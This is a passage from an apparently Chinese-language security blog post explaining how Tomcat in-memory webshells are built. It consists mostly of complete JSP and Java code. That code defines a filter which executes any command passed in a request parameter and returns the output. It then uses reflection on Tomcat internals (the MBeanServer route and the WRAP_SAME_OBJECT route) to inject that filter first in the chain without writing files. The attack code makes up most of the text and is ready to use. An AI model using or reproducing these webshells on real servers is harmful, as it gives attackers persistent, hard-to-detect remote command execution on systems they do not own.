filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            String cmd;</span><br><span class="line">            <span class="keyword">if</span> ((cmd = servletRequest.getParameter(cmdParamName)) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">                java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line">                        <span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">                StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    stringBuilder.append(line + <span class="string">'\n'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">                servletResponse.getOutputStream().flush();</span><br><span class="line">                servletResponse.getOutputStream().close();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> String filterName = <span class="string">"TomcatFilterShell"</span>;</span><br><span class="line">    <span class="keyword">final</span> String filterUrlPattern = <span class="string">"/xxxxxxx/*"</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">        MBeanServer mBeanServer = Registry.getRegistry(<span class="keyword">null</span>, <span class="keyword">null</span>).getMBeanServer();</span><br><span class="line"><span class="comment">// 获取mbsInterceptor</span></span><br><span class="line">        Field field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.JmxMBeanServer"</span>).getDeclaredField(<span class="string">"mbsInterceptor"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object mbsInterceptor = field.get(mBeanServer);</span><br><span class="line"><span class="comment">// 获取repository</span></span><br><span class="line">        field = Class.forName(<span class="string">"com.sun.jmx.interceptor.DefaultMBeanServerInterceptor"</span>).getDeclaredField(<span class="string">"repository"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object repository = field.get(mbsInterceptor);</span><br><span class="line"><span class="comment">// 获取domainTb</span></span><br><span class="line">        field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.Repository"</span>).getDeclaredField(<span class="string">"domainTb"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap&lt;String, Map&lt;String, NamedObject&gt;&gt; domainTb = (HashMap&lt;String,Map&lt;String,NamedObject&gt;&gt;)field.get(repository);</span><br><span class="line"><span class="comment">// 获取domain</span></span><br><span class="line">        NamedObject nonLoginAuthenticator = domainTb.get(<span class="string">"Catalina"</span>).get(<span class="string">"context=/,host=localhost,name=NonLoginAuthenticator,type=Valve"</span>);</span><br><span class="line">        out.println(<span class="string">"Inject /,please visit /xxxxxxx/aaaa?sectest666=whoami"</span>);</span><br><span class="line">        <span class="keyword">if</span>(nonLoginAuthenticator==<span class="keyword">null</span>)&#123;</span><br><span class="line">            nonLoginAuthenticator = domainTb.get(<span class="string">"Catalina"</span>).get(<span class="string">"context=/manager,host=localhost,name=BasicAuthenticator,type=Valve"</span>);</span><br><span class="line">        out.println(<span class="string">"Inject /,please visit /manager/xxxxxxx/aaaa?sectest666=whoami"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span>).getDeclaredField(<span class="string">"object"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object object = field.get(nonLoginAuthenticator);</span><br><span class="line"><span class="comment">// 获取resource</span></span><br><span class="line">        field = Class.forName(<span class="string">"org.apache.tomcat.util.modeler.BaseModelMBean"</span>).getDeclaredField(<span class="string">"resource"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object resource = field.get(object);</span><br><span class="line"><span class="comment">// 获取context</span></span><br><span class="line">        field = Class.forName(<span class="string">"org.apache.catalina.authenticator.AuthenticatorBase"</span>).getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        StandardContext context = (StandardContext) field.get(resource);</span><br><span class="line">        java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase<span class="class">.<span class="keyword">class</span></span></span><br><span class="line">                .getDeclaredField("state");</span><br><span class="line">        stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        stateField.set(context, org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class="line">        ApplicationContext appContext=<span class="keyword">new</span> ApplicationContext(context);</span><br><span class="line">        <span class="keyword">if</span> (appContext.getFilterRegistration(filterName) == <span class="keyword">null</span> &amp;&amp; context != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Filter tomcatShellFilter = <span class="keyword">new</span> TomcatShellFilter();</span><br><span class="line">            javax.servlet.FilterRegistration.Dynamic filterRegistration = appContext</span><br><span class="line">                    .addFilter(filterName, tomcatShellFilter);</span><br><span class="line">            filterRegistration.setInitParameter(<span class="string">"encoding"</span>, <span class="string">"utf-8"</span>);</span><br><span class="line">            filterRegistration.setAsyncSupported(<span class="keyword">false</span>);</span><br><span class="line">            filterRegistration</span><br><span class="line">                    .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="keyword">false</span>,</span><br><span class="line">                            <span class="keyword">new</span> String[]&#123;filterUrlPattern&#125;);</span><br><span class="line">            Method filterStartMethod = org.apache.catalina.core.StandardContext<span class="class">.<span class="keyword">class</span></span></span><br><span class="line">                    .getMethod("filterStart");</span><br><span class="line">            filterStartMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            filterStartMethod.invoke(context, <span class="keyword">null</span>);</span><br><span class="line">            Class ccc = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ccc = Class.forName(<span class="string">"org.apache.tomcat.util.descriptor.web.FilterMap"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t)&#123;&#125;</span><br><span class="line">            <span class="keyword">if</span> (ccc == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    ccc = Class.forName(<span class="string">"org.apache.catalina.deploy.FilterMap"</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t)&#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//把filter插到第一位</span></span><br><span class="line">            Class c = Class.forName(<span class="string">"org.apache.catalina.core.StandardContext"</span>);</span><br><span class="line">            Method m = c.getMethod(<span class="string">"findFilterMaps"</span>);</span><br><span class="line">            Object[] filterMaps = (Object[]) m.invoke(context);</span><br><span class="line">            Object[] tmpFilterMaps = <span class="keyword">new</span> Object[filterMaps.length];</span><br><span class="line">            <span class="keyword">int</span> index = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                Object o = filterMaps[i];</span><br><span class="line">                m = ccc.getMethod(<span class="string">"getFilterName"</span>);</span><br><span class="line">                String name = (String) m.invoke(o);</span><br><span class="line">                <span class="keyword">if</span> (name.equalsIgnoreCase(filterName)) &#123;</span><br><span class="line">                    tmpFilterMaps[<span class="number">0</span>] = o;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    tmpFilterMaps[index++] = filterMaps[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                filterMaps[i] = tmpFilterMaps[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        stateField.set(context, org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException | InvocationTargetException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException | NoSuchMethodException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h5 id="修改WRAP-SAME-OBJECT从request对象中获取"><a href="#修改WRAP-SAME-OBJECT从request对象中获取" class="headerlink" title="修改WRAP_SAME_OBJECT从request对象中获取"></a>修改WRAP_SAME_OBJECT从request对象中获取</h5><p>​        之前在介绍tomcat回显方案时介绍过可以通过修改WRAP_SAME_OBJECT的内容为true获取到request和response对象。获取到request对象后可通过<code>request.getServletContext()</code>获取到servletContext。获取servletContext的代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="comment">//获取各字段</span></span><br><span class="line">    java.lang.reflect.Field WRAP_SAME_OBJECT=Class.forName(<span class="string">"org.apache.catalina.core.ApplicationDispatcher"</span>).getDeclaredField(<span class="string">"WRAP_SAME_OBJECT"</span>);</span><br><span class="line">    Class applicationFilterChain = Class.forName(<span class="string">"org.apache.catalina.core.ApplicationFilterChain"</span>);</span><br><span class="line">    java.lang.reflect.Field lastServicedRequest = applicationFilterChain.getDeclaredField(<span class="string">"lastServicedRequest"</span>);</span><br><span class="line">    java.lang.reflect.Field lastServicedResponse = applicationFilterChain.getDeclaredField(<span class="string">"lastServicedResponse"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//去掉final修饰符</span></span><br><span class="line">    java.lang.reflect.Field modifiers = java.lang.reflect.Field.class.getDeclaredField("modifiers");</span><br><span class="line">    modifiers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    modifiers.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">    modifiers.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">    modifiers.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置允许访问</span></span><br><span class="line">    WRAP_SAME_OBJECT.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    lastServicedRequest.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    lastServicedResponse.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果是第一次请求，则修改各字段，否则获取cmd参数执行命令并返回结果</span></span><br><span class="line">    <span class="keyword">if</span>(!WRAP_SAME_OBJECT.getBoolean(<span class="keyword">null</span>))&#123;</span><br><span class="line">        WRAP_SAME_OBJECT.setBoolean(<span class="keyword">null</span>,<span class="keyword">true</span>);</span><br><span class="line">        lastServicedRequest.set(<span class="keyword">null</span>,<span class="keyword">new</span> ThreadLocal());</span><br><span class="line">        lastServicedResponse.set(<span class="keyword">null</span>,<span class="keyword">new</span> ThreadLocal());</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        ThreadLocal&lt;javax.servlet.ServletRequest&gt; threadLocalRequest = (ThreadLocal&lt;javax.servlet.ServletRequest&gt;) lastServicedRequest.get(<span class="keyword">null</span>);</span><br><span class="line">        javax.servlet.ServletRequest request = threadLocalRequest.get();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            javax.servlet.ServletContext servletContext=request.getServletContext();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        由于动态注册Filter需要修改standardContext的state属性，因此我们需要standardContext对象，此处的servletContext实际上时ApplicationContextFacade对象，通过servletContext可以获取到StandardContext对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field contextField=servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext); <span class="comment">//获取servletContext对象</span></span><br><span class="line">                    contextField=applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.catalina.core.StandardContext standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext); <span class="comment">//获取standardContext对象</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229115530952.png" alt="image-20201229115530952"></p>
<p>​        后面的实现和MBeanServer类似，直接给出JSP文件。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.management.MBeanServer"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.tomcat.util.modeler.Registry"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Field"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Map"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.HashMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Method"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.ApplicationContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.InvocationTargetException"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;servletContext&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> REInject</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TomcatShellFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * webshell命令参数名</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String cmdParamName = <span class="string">"sectest666"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse,</span></span></span><br><span class="line"><span class="function"><span class="params">                             FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            String cmd;</span><br><span class="line">            <span class="keyword">if</span> ((cmd = servletRequest.getParameter(cmdParamName)) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">                java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line">                        <span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">                StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    stringBuilder.append(line + <span class="string">'\n'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">                servletResponse.getOutputStream().flush();</span><br><span class="line">                servletResponse.getOutputStream().close();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> String filterName = <span class="string">"TomcatFilterShell"</span>;</span><br><span class="line">    <span class="keyword">final</span> String filterUrlPattern = <span class="string">"/xxxxxxx/*"</span>;</span><br><span class="line">          <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//获取各字段</span></span><br><span class="line">            java.lang.reflect.Field WRAP_SAME_OBJECT=Class.forName(<span class="string">"org.apache.catalina.core.ApplicationDispatcher"</span>).getDeclaredField(<span class="string">"WRAP_SAME_OBJECT"</span>);</span><br><span class="line">            Class applicationFilterChain = Class.forName(<span class="string">"org.apache.catalina.core.ApplicationFilterChain"</span>);</span><br><span class="line">            java.lang.reflect.Field lastServicedRequest = applicationFilterChain.getDeclaredField(<span class="string">"lastServicedRequest"</span>);</span><br><span class="line">            java.lang.reflect.Field lastServicedResponse = applicationFilterChain.getDeclaredField(<span class="string">"lastServicedResponse"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//去掉final修饰符</span></span><br><span class="line">            java.lang.reflect.Field modifiers = java.lang.reflect.Field.class.getDeclaredField("modifiers");</span><br><span class="line">            modifiers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            modifiers.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">            modifiers.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">            modifiers.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置允许访问</span></span><br><span class="line">            WRAP_SAME_OBJECT.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            lastServicedRequest.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            lastServicedResponse.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//如果是第一次请求，则修改各字段，否则获取cmd参数执行命令并返回结果</span></span><br><span class="line">            <span class="keyword">if</span>(!WRAP_SAME_OBJECT.getBoolean(<span class="keyword">null</span>))&#123;</span><br><span class="line">                WRAP_SAME_OBJECT.setBoolean(<span class="keyword">null</span>,<span class="keyword">true</span>);</span><br><span class="line">                lastServicedRequest.set(<span class="keyword">null</span>,<span class="keyword">new</span> ThreadLocal());</span><br><span class="line">                lastServicedResponse.set(<span class="keyword">null</span>,<span class="keyword">new</span> ThreadLocal());</span><br><span class="line">                out.println(<span class="string">"WRAP_SAME_OBJECT change success!please try again for Inject Filter"</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ThreadLocal&lt;javax.servlet.ServletRequest&gt; threadLocalRequest = (ThreadLocal&lt;javax.servlet.ServletRequest&gt;) lastServicedRequest.get(<span class="keyword">null</span>);</span><br><span class="line">                javax.servlet.ServletRequest request1 = threadLocalRequest.get();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//获取servletContext</span></span><br><span class="line">                    javax.servlet.ServletContext servletContext=request1.getServletContext();</span><br><span class="line">                    <span class="comment">//获取applicationContext</span></span><br><span class="line">                    java.lang.reflect.Field contextField=servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);</span><br><span class="line">                    <span class="comment">//获取standardContext</span></span><br><span class="line">                    contextField=applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.catalina.core.StandardContext standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);</span><br><span class="line">                    java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase<span class="class">.<span class="keyword">class</span></span></span><br><span class="line">                            .getDeclaredField("state");</span><br><span class="line">                    stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class="line">                    <span class="keyword">if</span> (applicationContext.getFilterRegistration(filterName) == <span class="keyword">null</span> &amp;&amp; standardContext != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        Filter tomcatShellFilter = <span class="keyword">new</span> TomcatShellFilter();</span><br><span class="line">                        javax.servlet.FilterRegistration.Dynamic filterRegistration = applicationContext</span><br><span class="line">                                .addFilter(filterName, tomcatShellFilter);</span><br><span class="line">                        filterRegistration.setInitParameter(<span class="string">"encoding"</span>, <span class="string">"utf-8"</span>);</span><br><span class="line">                        filterRegistration.setAsyncSupported(<span class="keyword">false</span>);</span><br><span class="line">                        filterRegistration</span><br><span class="line">                                .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="keyword">false</span>,</span><br><span class="line">                                        <span class="keyword">new</span> String[]&#123;filterUrlPattern&#125;);</span><br><span class="line">                        </span><br><span class="line">                        Method filterStartMethod = org.apache.catalina.core.StandardContext<span class="class">.<span class="keyword">class</span></span></span><br><span class="line">                                .getMethod("filterStart");</span><br><span class="line">                        filterStartMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        filterStartMethod.invoke(standardContext, <span class="keyword">null</span>);</span><br><span class="line">                        Class ccc = <span class="keyword">null</span>;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            ccc = Class.forName(<span class="string">"org.apache.tomcat.util.descriptor.web.FilterMap"</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Throwable t)&#123;&#125;</span><br><span class="line">                        <span class="keyword">if</span> (ccc == <span class="keyword">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                ccc = Class.forName(<span class="string">"org.apache.catalina.deploy.FilterMap"</span>);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (Throwable t)&#123;&#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">//把filter插到第一位</span></span><br><span class="line">                        Class c = Class.forName(<span class="string">"org.apache.catalina.core.StandardContext"</span>);</span><br><span class="line">                        Method m = c.getMethod(<span class="string">"findFilterMaps"</span>);</span><br><span class="line">                        Object[] filterMaps = (Object[]) m.invoke(standardContext);</span><br><span class="line">                        Object[] tmpFilterMaps = <span class="keyword">new</span> Object[filterMaps.length];</span><br><span class="line">           